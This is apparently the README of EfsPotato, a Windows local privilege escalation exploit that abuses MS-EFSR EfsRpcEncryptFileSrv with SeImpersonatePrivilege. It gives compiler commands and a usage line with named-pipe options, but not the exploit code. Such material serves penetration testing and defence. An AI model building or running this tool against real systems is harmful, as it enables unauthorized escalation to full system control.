## Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).

### build

	#for 4.x
	csc EfsPotato.cs
	csc /platform:x86 EfsPotato.cs
	
	#for 2.0/3.5
	C:\Windows\Microsoft.Net\Framework\V3.5\csc.exe EfsPotato.cs
	C:\Windows\Microsoft.Net\Framework\V3.5\csc.exe /platform:x86 EfsPotato.cs

### usage

	usage: EfsPotato <cmd> [pipe]
  	  pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)

![](https://raw.githubusercontent.com/zcgonvh/EfsPotato/master/test.png)
 
